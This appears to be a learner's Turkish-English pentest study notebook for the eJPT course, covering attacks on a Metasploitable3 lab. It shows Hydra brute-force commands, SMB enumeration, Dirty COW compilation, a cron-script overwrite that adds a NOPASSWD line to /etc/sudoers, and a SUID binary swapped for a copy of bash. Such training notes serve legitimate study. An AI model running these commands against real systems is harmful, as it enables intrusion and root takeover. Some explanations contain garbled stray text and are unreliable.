● Linux is a free and open source operating system that is comprised of the Linux kernel, which was developed by <span style="background:#d4b106">Linus Torvalds,</span> and the GNU toolkit, which is a collection of software and utilities that was started and developed <span style="background:#d4b106">by Richard Stallman.</span>

● This combination of open source software is what makes up the Linux OS as a whole, and it is commonly referred to as <span style="background:#d4b106">GNU/Linux</span>.

![[Pasted image 20240208110453.png]]
Free and open source cross-platform web server released under the Apache License 2.0. Apache accounts for <span style="background:#d4b106">over 80% of web servers globally.</span>

### PORT 80/443 APACHE
### PORT 22 SSH
### PORT 21 FTP
### PORT 445 SAMBA - LINUX
### PORT 23 TELNET
---


## Exploiting FTP
#ftp 
+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to <span style="background:#d4b106">facilitate file sharing </span>between a server and client/clients.

+ It is also frequently used as a means of transferring files to and from the directory of a web server.
+ FTP authentication requires a username and password combination.<span style="background:#d4b106"> As a result, we can perform a brute-force attack on the FTP server in order to identify legitimate credentials.</span>
+
+ <span style="background:#d4b106">In some cases, FTP servers may be configured to allow anonymous access,</span> which consequently allows anyone to access to the FTP server without providing any legitimate credentials.

## FTP 'yi Exploit Etmek için
### 1. Brute Force Attack
### 2. Anonymous Login
### 3. Belirli Versiyonlardaki Açıklar


---

#ftp 
## FTP gördüğümde önce anonymous access var mı yok mu buna bakacağız

>ftp 10.0.2.16
username:anonymous
password: anonymous

![[Pasted image 20240208124850.png]]
### Bu senaryoda gözükmüyor böyle bir durum. Versiyouna ve Brute force durumuna bakacağız.

![[Pasted image 20240208125019.png]]
##### Version: ProFTPD 1.3.5
![[Pasted image 20240208125133.png]]
![[Pasted image 20240208125152.png]]

### Bu Versiyonda searchsploit'e baktık ve var exploit'leri bunları kullanarak Erişim elde edilebilir.

---
## Hydra - FTP - Brute Force
#hydra-ftp 
![[Pasted image 20240208125649.png]]

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt ftp://10.0.2.16
```

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.235.127.3 -t 4 ftp
```

![[Pasted image 20240208130419.png]]


---
>[!bug] "229 Entering Extended Passive Mode (|||55693|)"
>FTP'YE GİRERKEN SUREKLİ BU SEKİLDE UYARI VERİYORDU. CUNKU FTP PASSIVE MODDA KALMIS
>>passive    
>>komutu yazınca passive mode off yazdı ve düzeldi
>
>![[Pasted image 20240208131742.png]]

-----

# Exploiting SSH

#ssh
#brute-force-ssh

● SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.

● SSH authentication can be configured in two ways:
<span style="background:#d4b106">○ Username & password authentication</span>
<span style="background:#d4b106">○ Key based authentication</span>
 
 ---
### HYDRA SSH BRUTE FORCE
### HYDRA Graphic SSH BRUTE FORCE
![[Pasted image 20240210213917.png]]
![[Pasted image 20240210213932.png]]
### hydra -l vagrant -P /opt/rockyou.txt ssh://10.0.2.16
```
hydra -l vagrant -P /opt/rockyou.txt ssh://10.0.2.16
```

```
hydra -l vagrant -P /opt/rockyou.txt -t 4 10.0.2.16 ssh
```

#hydra-ssh


---

## MSFCONSOLE SSH
#msfconsole-ssh


### msf6> search ssh login
### msf6>use auxiliary(scanner/ssh/ssh_login)


```
set RHOSTS 10.0.2.16
set verbose true
set USERNAME 
set PASS_FILE /opt/rockyou.txt
set STOP_ON_SUCCESS true 
set VerBOSE true
RUN
```


![[Pasted image 20240210214546.png]]

![[Pasted image 20240210214929.png]]

## SSH LOGIN
![[Pasted image 20240210214956.png]]
```
ssh vagrant@10.0.2.16
vagrant@10.0.2.16's password: vagrant
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

```

---

whoami
groups
sudo -L
sudo su
### cat /etc/*issue 
![[Pasted image 20240210215332.png]]


![[Pasted image 20240210215244.png]]

---
### KERNEL VERSION
#kernel-version
## uname -r
## uname -a
![[Pasted image 20240210215436.png]]
![[Pasted image 20240210215514.png]]

## cat /etc/passwd

![[Pasted image 20240210215605.png]]

---


# CVE-2014-6271 - Shellshock

#CVE-2014-6271 
#Shellshock
##### Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that <span style="background:#d4b106">allow an attacker to execute remote arbitrary commands via Bash</span>, <span style="background:#40a9ff">consequently allowing the attacker to obtain remote access to the target system via a reverse shell.</span>

---

### The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.

#### This vulnerability only affects Linux as Windows does not use utilize Bash

## Shellshock Exploitation

● In order to exploit this vulnerability, <font color="#ffff00">you will need to locate an input vector or script that allows you to communicate with Bash.</font>
● In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.
● Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.
<span style="background:#d4b106">● This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.</span>



---
---

# Exploiting SAMBA
#SAMBA 


● SMB <span style="background:#d4b106">(Server Message Block)</span> is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

### Burada LAN üzerinden olan bir çevresel birim ve dosya paylaşımı söz konusu buna dikkat et.

### LAN ortamında 5-10 bilgisayar aynı ağda çalışıyor ve dosya paylaşman istenebilir. Bu durumda SMB kullanılabilir.

## Burada Enumerating Share 'e odaklanacağız.




#psexec 
#crackmapexec-smb 
● SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
#port139 
#port445 

● Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

● SAMBA utilizes username and password authentication
● We can perform a brute-force attack on the SAMBA 
● After obtaining legitimate credentials, we can use a utility called #SMBMap in order to enumerate SAMBA share drives, list the contents of the shares as well as download files and execute remote commands on the target.
● We can also utilize a tool called #smbclient. smbclient is a client that is part of the SAMBA software suite. It communicates with a LAN Manager server, offering an interface similar to that of the ftp program. It can be used to download files from the server to the local machine, upload files from the local machine to the server as well as retrieve directory information from the server.


---
#smbclient 
#hydra 
#hydra-smb-login 
#smb-enum4linux 

## Hydra
![[Pasted image 20240211215855.png]]
### hydra -l admin -P /opt/rockyou.txt 10.0.2.16 smb

---

## Şimdi Yaptığımız brute force sonucu SMB credentials'ı aldık.

### Şöyle ki Enumeration safhasında zaten muhtemel username'leri almıştık. Username list ile de hydra çalıştırılabilir ya da enum4linux'dan veya diğer elde ettiğimiz tool'lardan yapılan enum ile de username bulunabilir.

---

### SMBMAP
#smb-map 
![[Pasted image 20240211231240.png]]
![[Pasted image 20240211231256.png]]

## smpmap -u vagrant -p vagrant  -H 10.0.2.16

### Eğer smb'nin Shares'lerini Enumerate yapmak istersek 
##### smbmap -H 10.0.2.16 -u admin -p password1
![[Pasted image 20240211231544.png]]
### Smb'nin share'leri yani paylaşılan dosyaları ortaya çıkarır.

## Şimdi BU share'lere ulaşmak istiyoruz.

#smbclient 
## SMBCLIENT
![[Pasted image 20240212095558.png]]
#### Direk smbclient yazark da kullanılışını öğrenebiliriz 
```
man smbslient
```
#### yazarak da kullanılışını öğrenebiliriz.

### #smbclient bize FTP gibi dynamic olarak shares'kerde gezinme olanağı verir.


---

![[Pasted image 20240212095958.png]]
![[Pasted image 20240212100616.png]]

---

### SMBCLIENT share'E erişmek
![[Pasted image 20240212100843.png]]
```
smbclient //10.0.2.16/IPC$ -U vagrant
Password: vagrant
```

![[Pasted image 20240212101224.png]]


### Burada yapılması gereken, Enum esanısında ne kadar share bulduysak hepsini tek tek enumeration yaparak dolaşmak ve bilgi toplamak. 

#### "Get" komutu ile smbclient ile hangi klasör ve dosyalara erişebiliyorsak kendi bilgisayarımıza çekmek çok önemli.
![[Pasted image 20240212101646.png]]

---

## #smb-enum4linux 
### enum4linux -a 10.0.2.16
![[Pasted image 20240212101844.png]]
![[Pasted image 20240212101905.png]]
![[Pasted image 20240212101922.png]]

---
### SMB null session 'a izin yok demekki config dosyası doğru yapılmış.
![[Pasted image 20240212102406.png]]

![[Pasted image 20240212102931.png]]
```
enum4linux -a 10.0.2.16 -u administrator -p 8835060043
```
![[Pasted image 20240212103148.png]]
![[Pasted image 20240212103328.png]]


---
----
---

# Linux Kernel Exploitation
#linux-kernel-exploit
● Kernel exploits on Linux will typically target vulnerabilities In the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

● Privilege escalation on Linux systems will typically follow the following methodology:
### Metadoloji Bu şekilde
## <span style="background:#d4b106">+ Identifying kernel vulnerabilities</span>

## <span style="background:#d4b106">+ Downloading, compiling and transferring kernel exploits onto the target system.</span>

### Tipik olarak C dili ile yazılmış exploit kodu compile edip hedef makineye göderip burada çalıştırarak yetkimizi yukseltiyoruz.

## Linux-Exploit-Suggester
#Linux-Exploit-Suggester
## https://github.com/mzet-/linux-exploit-suggester

![[Pasted image 20240212113312.png]]
![[Pasted image 20240212113331.png]]
>[!warning] Github'dan yüklediğim linux-exploit-suggester karşı tarafta ./linux-exploit-suggerter.sh komutuyla çalışmadı. BUNUN ÜZERİNE SH UZANTILI DOSYAYI BASH İLE ÇALIŞTIRMA YOLUNA GİTTİK. 
>	which bash
>	/bin/bash linux-exploit-suggester.sh    bu şekilde çalıştırdık ve bize bu kernel'de olan zaafiyetleri sıraladı.


---
## Kernel Exploit'ler sürümden sürüme farkeder. Windows'ta bu durum kolay çünkü 7-8-8.1-10-11 şeklinde devam ediyor ama linux da her bir kernel sürümünün farklı exploiti olabilir. Bize de bunu linux-exploit-suggester verecek.

---

#### Çok Önemli Not: Kernel Exploit'ler direk bilgisayarın CORE KErnel'ını hedef aldığı için doğru kernel versiyon ile yapılmadığın da hedefte crash'lere neden olabilir.
#### Özellikle kurumsal firmalara pentest yaparken bu tekniği kullanırken son derece dikkatli olunmalıdır. Müşteri DATA kaybına ugrayabilir ve bu durum da hiç hoş olmaz.

---
#meterpreter-linux-reverse-shell

## linux/x86/meterpreter/reverse_tcp)
#### Önemli not Meterpreter shell alacaksan linux'dan bu payload'ı seç diğer hata veriyor.


---

## EXPOIT
### Biz senaryo gereği zaten bir zzafiyeti kullanıp meterpreter shell aldık.

##### Şimdi aldığımız shell'le linux-exploit-suggester dosyasını biz meterpreter-upload ile hedefin tmp klasörüne atıp çalıştıracağız.

```
upload /home/kali/Documents/eJPT/linux-exploit-suggester/linux-exploit-suggester.sh
```
![[Pasted image 20240212222656.png]]

![[Pasted image 20240212222802.png]]
### Sonra meterpreter'den shell'e geçiş yapıyoruz.

```
/bin/bash -i
```
#meterpreter-shell-bin-bash
![[Pasted image 20240212222935.png]]
#### Neden böyle yaptık çünkü shell aldığımızdaki gelen shell stabil ve anlaşılır değildi. Bunu ya /bin/bash -i ile yapabiliriz ya da python varsa python spawn shell ile yapabiliriz.

```
vagrant@metasploitable3-ub1404:/tmp$ chmod +x linux-exploit-suggester.sh

vagrant@metasploitable3-ub1404:/tmp$ ls -la

vagrant@metasploitable3-ub1404:/tmp$ ./linux-exploit-suggester.sh
```


![[Pasted image 20240212223414.png]]

### Burada yaptığımız şu--> upload ile meterpreter ile karşıya exploit-suggester'ı attık
## Shell'e çevirdik ve onu /bin/bash -i ile daha istikrarlı hale getirdik
##### Sonra chmod +x ile linux-exploit-suggester'I executable yaptık

### ./linux-exploit-suggester.sh
## Çalıştırdık
---
#kernel-version 
![[Pasted image 20240212223928.png]]
### Exploit-suggester'ın bize sağladığı en ama en önemli bölüm kernel exploit açısından burasıdır.

![[Pasted image 20240212224050.png]]
81 tane kernel
49 tane normal user space exploit buldu


---
## En üstte sıralanan exploit'ler genelde exploit şansı daha yuksek olanlar.
#dirtycow 
![[Pasted image 20240212224257.png]]
![[Pasted image 20240212224312.png]]
### Burada zaten açıklıyor bize tool --> detailleri github da 
#### Exposure: Highly Probable

## Bu veriyi yorumlarken en önemlisi TAG --->> çünkü hangi distribution'un hangi Release'si bu vuln'a uygun onu yazıyor.
### #dirtycow ubuntu=16.04|14.04|12.04
##### Önemli olan bunu yakalamak. dirtycow ubuntunun bu versiyon kernelinde exploit edilebiliyor.

#### Download URL: https://www.exploit-db.com/download/40611
##### Download linkine kadar veriyor daha ne yapsın.

---
## Exploit #dirtycow-2 

#dirtycow-2
![[Pasted image 20240212223324.png]]

![[Pasted image 20240212225319.png]]


![[Pasted image 20240212225739.png]]


#### Download URL: https://www.exploit-db.com/download/40839

![[Pasted image 20240212225425.png]]

### Link Direk zaten indiriyor. Biz bunu eJPT klasörümüz içine alıyoruz ki yerini raha bulalım.
##### mv /home/kali/Downloads/40839.c  .

![[Pasted image 20240212225826.png]]
![[Pasted image 20240212230012.png]]

## Burada yapman gereken exploit dosyamızı gcc ile compile etmek --> derlemek
### Compile Edildikten sonraki Binary'i hedef makineye göndermek
## Sonra da çalıştırmak
![[Pasted image 20240212230247.png]]
### İstersen firefart olan username'i değiştirebilirsin exploit'in kodlarından.


---
#compile-c
#gcc
#GNU-C-COMPILER
### Compile işlemi için gcc packete ihtiyacın var. Ister kendi bilgisayarında compile et karşıya öyle gonder istersen karşıda gcc varsa orada compile et çalıştır. 
## gcc yuklemek
```
apt-get install gcc         
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
gcc is already the newest version (4:13.2.0-2).
gcc set to manually installed.

```

### gcc -pthread dirty.c -o dirty -lcrypt

![[Pasted image 20240212231142.png]]
### gcc -pthread 40839.c -o dirty -lcrypt

>[!warning] Önemli NOT>>> Biz şimdi bunu kendi bilgisayarımızda gcc ile derledik compile ettik fakat çalışmazsa meterpreter ile önce 40839.c 'yi gönderecez sonra gcc yapacaz.
### meterpreter'e geri dön --> Sonra upload et ikisinide ne olur ne olmaz.
![[Pasted image 20240212231539.png]]


---
![[Pasted image 20240212231739.png]]
#### Yine shell yaptık ve bin bash -i ile stabil shell'e çevirdik. executable yaptık dosyamızı. 
### Exploit'in çalışması için ./dirty passwd123 parola yazarak çalıştırmamız lazım. Cunku bu exploit sudo yetkilerine sahip bir kullanıcı yaratarak yetki yukseltiyor. 

#### Çalıştırdık olmadı demekki gcc işlemini burada yapacağız.

## Önce dirty'i sildik sonra bastık gcc'yi derledik
![[Pasted image 20240212232057.png]]
### chmod +x dirty
### ./dirty passs


### Biz şifre yanına yazarak firefart isimli kullanıcıyyı oluşturmasını istedik programın.
![[Pasted image 20240212233027.png]]
## Cat /etc/passwd De kontrol ettiğimizde firefart'ın /binbash'i root yetkisiyle çalıştırabilme yetkisi var.


---

>[!warning] Biz normal yolda "su firefart " komutuyla girmek istedik fakat terminal de çalıştırman lazım diye hata verdi.   Bunu önüne geçmek için bizde SSH ile bağlanmayı tercih ediyoruz. ssh firefart@10.0.2.16  -----> passs      şifre olarak fa bunu belirlemiştik.


#### #ssh ile Burada firefart kullanıcısı olarak girdik ama bash 'de sudo  root yetkimizz var herşeyin önüne sudo yazarak root yetkisiyle çalıştırabiliriz.

![[Pasted image 20240212235012.png]]

---
----
----


# Cron Jobs
#cron-job
#crontab 
● Linux implements <span style="background:#d4b106">task scheduling</span> through a utility called Cron.
● Cron is a time-based service that runs applications, scripts and other commands <span style="background:#d4b106">repeatedly on a specified schedule.</span>
● An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
## Crontab
● The #crontab file is a <span style="background:#d4b106">configuration file</span> that is used by the Cron utility to store and track Cron jobs that have been created.


## Exploiting Misconfigured Cron Jobs
#cronjob-exploit

● Cron jobs can also be run as any user on the system, this is a very important factor to 
### keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user.
##### Olay şu root yetkisiyle kullanılan cronjob var mı ve biz bunu manüple edebiliyomuyuz / değiştirebiliyomuyuz.
## Örnek : Her 5 dakika da bir backup al home klasörüne yükle komutu verilmiş cronjobs ile biz bu cronjobs'un içeriğini PATH'ini değiştirebiliyorsak her 5 dakikada bir ROOT yetkisiyle LHOST=10.0.2.4 LPORT =4444 buraya shell aç da diyebiliriz.



● This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
<span style="background:#d4b106">● In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.</span>


##### Senaryoda biz bir sisteme erişim sağladık ve cronjob'alara baktık. Standart user yetkisinde olmasına rağmen sistem yöneticisi bir tane dosya içine bir script yazmış ve bu script de her 5 dakikada bir backup alınmasıyla ilgili veya guncelleme kontrolu yapılmasıyla ilgili. Yalnız bu dosyaya cronjobs'una erişim ve değiştirme yetkisini kısıtlamamış ve root yetkisiyle çalışıp yazdığı script'i çalıştırıyor. Geçmiş olsun
### NC ile bir dinleyici açarım
### Yazılan script'in içine bir adet basit reverse shell yazarım ve root yetkisiyle bu işlem yapıldığı için root shell alırım.
![[Pasted image 20240213104112.png]]
### Tam olarak olay bunda gizli -->> CRONJOBs'a yanlış uygun olmayan izin verilmişse bu scripte veya tool'a

---

## Exploit
### Metasploitable 3 'den shell.elf 'i çalıştırdım ve diğer tarafta nc -nvlp 1234 ile dinleme yapıyordum.

##### nc ile shell aldım ama stable değil /bin/bash -i çalıştırdım başarılı oldu ve vagrant user olarak sistemde'yim.

![[Pasted image 20240213104658.png]]

## CronJob için Enumeration Başlasın

### 1. crontab -l
![[Pasted image 20240213105000.png]]

### 2. ls -la çalıştırdık enum devam ediyo
### vagrant user'ının user klasörün de cronjob.sh isminde root yetkisiyle çalıştırılabilecek bir dosya var.
![[Pasted image 20240213105558.png]]

##### Burada da aynı şekilde biz buna direk erişmek istediğimizde izin vermiyor fakat bizim klasörde duruyor
![[Pasted image 20240213110022.png]]
### Şimditeki öğretmenin senaryosu üzerinden devam edelim. Şimdi bayram değil seyran değil neden benim student user klasörümde benim erişemeyeceğim bir message adlı bir dosya var. Bunun üzerinde bi işlem yapılıyor olması lazım ve bir PATH izliyor olması lazım 
### #grep özelliğini kullanıp bu message ne yapıyor neden burada bunu bulacağız.

---
## ÖNCE ROOT DIRECTORY'e çık
### Önce /    yani root directory'e çıkıyoruz.
## grep
## -rnw recursive'i olarak search
### /usr directory'den başlayarak
### /home/student/message ---> Bu yola doğru neler oluyor buna bak
![[Pasted image 20240213110756.png]]
```
grep -rnw /usr -e "/home/student/message"
```
##### grep -rnw /usr -e "/home/student/message"

Bu komut, `/usr` dizininde ve alt dizinlerinde `/home/student/message` dizgisini içeren tüm dosyaları arar ve sonuçları satır satır yazdırır.

**Komutun parçalarını inceleyelim:**

- **`grep`:** Belirtilen bir dizgiyi içeren dosyaları arar.
- **`-rnw`:** Arama seçeneklerini belirler:
    
    - **`-r`:** <span style="background:#d4b106">Rekürsif arama yapar, yani `/usr` dizininin alt dizinlerini de tarar.</span>
    - **`-n`:** Eşleşen her satırın satır numarasını da yazdırır.
    - **`-w`:** Aranan dizginin tam bir kelime olması gerektiğini belirtir.
    
- **`/usr`:** <span style="background:#d4b106">Aramanın başlayacağı dizin.</span>
- **`-e`:** Aranacak dizgiyi belirtir. Bu durumda, `/home/student/message`.

**Komutun çıktısı:**

Komut, `/usr` dizininde ve alt dizinlerinde `/home/student/message` dizgisini içeren her dosya için aşağıdaki bilgileri yazdıracaktır:

- <span style="background:#d4b106">Dosyanın tam yolu</span>
<span style="background:#d4b106">- Eşleşen satır numarası (sadece `-n` seçeneği belirtilmişse)</span>
<span style="background:#d4b106">- Eşleşen satır</span>

**Örnek:**

Diyelim ki `/usr/local/bin/my-script` dosyasında aşağıdaki satır var:

```
echo "Merhaba, öğrenci!" > /home/student/message
```

Bu komutu çalıştırırsanız, aşağıdaki çıktıyı alırsınız:

```
/usr/local/bin/my-script:1
echo "Merhaba, öğrenci!" > /home/student/message
```

----

## AYNISININ BENZERI
```
grep -nri “/tmp/message” /usr
```
![[Pasted image 20240213122330.png]]

---

## KOMUT ASLINDA ŞUNU YAPIYOR "MESSAGE" DOSYASININ PATH'INDE NELER OLUYOR HANIG KOMUTLAR ÇALIŞIYPR BUNU BULUYOR.
**Notlar:**

- Bu komut, root veya sudo yetkisiyle çalıştırılmalıdır.
- Aranan dizgide boşluk varsa, tırnak işaretleri (" ") ile囲まなければなりません。
- Daha karmaşık arama yapmak için `grep` komutunun diğer seçeneklerini de kullanabilirsiniz.
![[Pasted image 20240213111837.png]]
### Bir shell script bulduk. message dosyasına /usr/local/share/copy.sh dosyasını cp yapıyor tmp/message dosyasına kaydediyor.

## ls -la /tmp
![[Pasted image 20240213112001.png]]

##### tmp klasörü içine baktığımızda message dosyasının buraya koplayalandığını gördük.

### şimdi birde copy.sh dosyası yetkilerine bakalım. eğer bu dosyaya birşeyler yazma yetkimiz varsa bunu kullanabiliriz.
![[Pasted image 20240213112413.png]]
##### ls -la /usr/local/share/copy.sh
#### Bu dosyanın root'a ait olduğunu gördüm ama yazma yetkimin olduğunu da gördüm.

## Şimdi bizim bu dosyayı execute yetkimiz var ama biz bunu execute edersek student yetkisiyle olur ama bunu root'un yazdığı cronjobs yetkisiyle yapılırsa bu execution root yetkisiyle olur ve bize root shell verir.

![[Pasted image 20240213112921.png]]
### Bunun içini okuduğumuzda diyor ki            1 . system bash'i aç ve message'nin           2. içeriğini tmp'ye cp.yala
### 3. tmp içindeki message'ı da sadece herkes okuyabilsin.

### Bu her 1 dk.da bir çalışıyor.

![[Pasted image 20240213122055.png]]
## Cronjob 'ları listeleyemediğimizden bilemiyorduk ancak ls -la ile ortaya çıktı 1 dk da bir çalıştığı
---

## HEDEF bilgisayarda eğer hiç text editor yoksa ne yapacaksın.
#printf
#printf-text-editor-yok

#nano-yok
#vim-yok


![[Pasted image 20240213120548.png]]
### printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

Bu komut, aşağıdakileri yapan bir kabuk betiği (`copy.sh`) oluşturur:

2. Betiği `bash` kabuğuyla çalıştırır.
4. `echo` komutunu kullanarak `"student ALL=NOPASSWD:ALL"` metnini `/etc/sudoers` dosyasına ekler.

**Komutun parçalarını inceleyelim:**

- **`printf`:** Belirtilen formata göre bir metin oluşturur ve standart çıktıya yazar.
- **`#!/bin/bash`:** Betiğin `bash` kabuğuyla çalıştırılacağını belirtir.
- **`echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`:**
    
    - `echo`: Belirtilen metni yazdırır.
    - `"student ALL=NOPASSWD:ALL"`: `sudoers` dosyasına eklenecek metin. Bu metin, `student` kullanıcısına tüm komutları şifresiz çalıştırma yetkisi verir.
    - `>>`: Metni dosyanın sonuna ekler.
    - `/etc/sudoers`: `sudo` komutunun hangi kullanıcıların hangi komutları çalıştırabileceğini kontrol ettiği dosya.
    
- **`/usr/local/share/copy.sh`:** Oluşturulan kabuk betiğinin kaydedileceği yer.

**Komutun etkisi:**

Bu komut çalıştırıldığında, `/usr/local/share/copy.sh` adında bir kabuk betiği oluşturulur. Bu betik çalıştırıldığında, `student` kullanıcısına tüm komutları şifresiz çalıştırma yetkisi verilir.

**Notlar:**

- Bu komut, root veya sudo yetkisiyle çalıştırılmalıdır.
- Bu komutu çalıştırmadan önce, `student` kullanıcısına gerçekten tüm komutları şifresiz çalıştırma yetkisi vermek isteyip istemediğinizi dikkatlice düşünün.
- Bu komut, `sudoers` dosyasını doğrudan düzenlemediği için daha güvenli bir yöntem olarak kabul edilir.

---

### Birkaç dakika bekledikten sonra ![[Pasted image 20240213121137.png]]
## Buradaki senaryoda reverse shell almak yerine kendimizi root yetkisiyle sudoer yaptık ve nopasswd ile heryere erişim izni verdik.

---

## sudo su   --->>> yazdık mı şifresiz root kullanıcısı olur.

---

![[Pasted image 20240213121350.png]]


### crontab -l
![[Pasted image 20240213121903.png]]
### ROOT olduktan sonra görebildik

---

# Exploiting SUID Binaries
#suid 

### (read, write and execute), Yetkilerine ilave olarak özel durumlar için Linux 'un SUID (Set Owner User ID) özel yetkisi vardır. Hacker olarak da bu oluşan özel durumdan faydalanmak da bizim en 1. görevimizdir.

##### Tipik olarak SUID kullanımı yetkisi düşük kullanıcılara ROOT yetkisiyle bir script binary kullanma yetkisi dağıtarak sistem yöneticisinin yükünü azaltmaktır.
## Biz bu yetkilendirmedeli misconfiguration'u kullanacağız. 

● When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.

<span style="background:#d4b106">● SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with “root” permissions.</span> It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not
translate to elevation of privileges, however, <span style="background:#ff4d4f">if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.</span>

Saldırımızın başarısı aşağıdaki faktörlere bağlı olacaktır:
## Binary sahibi ROOT olması lazım
- SUID binary dosyasının sahibi: Ayrıcalıklarımızı yükseltmeye çalıştığımızdan, yalnızca "root" kullanıcısı veya diğer ayrıcalıklı kullanıcılara ait olan SUID binary dosyalarını sömürüyor olacağız.
-<span style="background:#ff4d4f"> Erişim izinleri: SUID ikili dosyasını yürütmek için yürütme izinlerine ihtiyacımız olacak.</span>
## execution iznimiz olması lazım

---

### Bu yetkilendirme yapılmış Binary'ler neler olabilir.
https://gtfobins.github.io/#+suid
## sudo


---

## Exploit
### Yine metasploitable 'a  NC -nvlp 1234 ile shell aldık diğer tarafta shell.elf çalıştırarak
##### /bin/bash -i   ---> stabil shell için

---

## Öğretmenin Senaryosu
![[Pasted image 20240213130836.png]]
##### Student kullanıcısı olarak erişim sağlandı. home/student directory de 2 tane root'a ait dosya var.
### -rwsr-xr-x yetkisi olan welcome dosyası var --> bu bizi dikkatimizi çekiyor çünkü bu hem root'a ait hem de herkes x   execute edebiliyor group'lar da user'lar da 
## Burada -rwsr-xr-x   "s" harfine dikkat edersen bu SUID permission demektir. Yani herkes bu dosyayı execute edebiliyor ancak SUID yetkisiyle root yetkisiyle execute etme yetkisi verilmiş bize.
![[Pasted image 20240213131335.png]]
### Örneğin greetings dosyasını execute edemiyoruz.

---

## FILE COMMAND
#file 
![[Pasted image 20240213131456.png]]
### file welcome
##### BU dosyanın setuid yetkisine sahip bir elf uzantılı dosya olduğunu görüyoruz. 


---

### strings welcome
`strings` komutu, bir dosyadaki yazdırılabilir karakter dizilerini (yani metin) listeler. `welcome.elf` dosyası bir ELF dosyası olduğundan, bu komut dosyadaki tüm metin dizilerini, örneğin programın adını, sürüm numarasını, telif hakkı bilgilerini ve hata iletileri gibi metinleri yazdıracaktır.
![[Pasted image 20240213132010.png]]
### setuid olduğunu görüyoruz.
## Ayrıca ilginç bir şekilde greetings dosyasına çağrı yaptığını görüyoruz.
#### Dışarıdan bir binary'e call on yaptığını görüyoruz.
![[Pasted image 20240213132139.png]]


## Önemli nokta şu bu bizim SUID yetkili binary 'miz external bir binary'e istekte bulunuyor ve onu çalıştırıyor. Eğer ben bu external dosyaya müdahele edersem bizim müdahele ettiğimiz şekilde root yetkileriyle bu binary'i çalıştıracak demektir.


---

### EXPLOIT

## 1. greetings binary'i silmeyi deniyorum.
### rm greetings
![[Pasted image 20240213132553.png]]
### Şimdi gereisi kolay biz kendi greetings binary'i üreteceğiz malicious code ile ve root shell alacağız.

## 2. Bize shell lazım demi root etkisiyle 
## --->> cp /bin/bash greetings

### Bunu yaptık mı ne olur. Welcome dosyasını SUID yetkisiyle çalıştırdığımızda o da gider greetings'i çalıştırır. Peki greetings ne ---->> /bin/bash'in kopyalanmış hali
![[Pasted image 20240213133059.png]]

### ./welcome
![[Pasted image 20240213133131.png]]
![[Pasted image 20240213133207.png]]
# Buna missing shared object de denilebilir. Çünkü çalıştırılacak binary kayıp ve ya biz sildik kaybettik sonra yerine melicious bir binary kendimiz yazdık koyduk.
## Geçmiş olsun.....

---
---
## SUID Yetkisi vermek
Linux sistemlerinde bir dosyaya SUID (Set User ID) yetkisi vermek için **chmod** komutunu kullanabilirsiniz. Komutun kullanımı şu şekildedir:
#suid #suid-yetki-verme

```
chmod u+s dosya_adi
```

**Komutun parçalarını inceleyelim:**

- **chmod:** Dosya izinlerini değiştirmek için kullanılır.
- **u+s:**
    
    - **u:** Kullanıcı (user) için izinleri değiştirir.
    - **+:** İzin ekler.
    - **s:** SUID yetkisini ekler.
    
- **dosya_adi:** SUID yetkisi vermek istediğiniz dosyanın adı.

**Örnek:**

`/usr/local/bin/my-script` dosyasına SUID yetkisi vermek için aşağıdaki komutu kullanabilirsiniz:

```
chmod u+s /usr/local/bin/my-script
```

Bu komutu çalıştırdıktan sonra, `my-script` dosyasını hangi kullanıcı çalıştırırsa çalıştırsın, dosyanın sahibi olan kullanıcının (root) yetkileriyle çalışacaktır.

---
---


# Linux Password Hashes
#linux-hashes

● <span style="background:#d4b106">Linux has multi-user </span>support and as a result, multiple users can access the system simultaneously. <span style="background:#d4b106">This can be seen as both an advantage and disadvantage from a security perspective,</span> in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.

<span style="background:#d4b106">● All of the information for all accounts on Linux is stored in the passwd file located in:</span>
<span style="background:#d4b106">/etc/passwd</span>

● We cannot view the passwords for the users in the passwd file because they are encrypted and the <span style="background:#d4b106">passwd file is readable by any user on the system.</span>
<span style="background:#d4b106">● All the encrypted passwords for the users are stored in the shadow file.</span> 
it can be found in the
following directory: <span style="background:#ff4d4f">/etc/shadow</span>

<span style="background:#ff4d4f">● The shadow file can only be accessed and read by the root account</span>, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.


### The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as<span style="background:#d4b106"> we are able to determine the type of hashing algorithm that is being used and its strength.</span> <font color="#ff0000">We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).</font>
![[Pasted image 20240213134213.png]]
#md5 #SHA-256 #SHA-512 
